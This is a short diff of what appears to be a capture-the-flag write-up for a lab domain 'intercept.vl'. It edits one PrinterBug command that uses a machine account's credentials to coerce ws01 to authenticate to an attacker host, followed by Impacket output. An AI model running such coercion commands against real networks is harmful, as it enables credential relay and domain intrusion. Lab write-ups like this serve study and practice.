@@ -234,7 +234,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 We can use PrinterBug to trigger it.
 
 ```zsh
-➜  krbrelayx git:(master) python3 /home/user/tools/krbrelayx/printerbug.py intercept.vl/'please$':'Chocolate1'@ws01.intercept.vl attackerhost@80/asdf
+➜  krbrelayx git:(master) python3 /home/user/tools/krbrelayx/printerbug.py intercept.vl/'xpp$':'P@ssword1!'@ws01.intercept.vl attackerhost@80/asdf
 [*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Attempting to trigger authentication via rprn RPC at ws01.intercept.vl
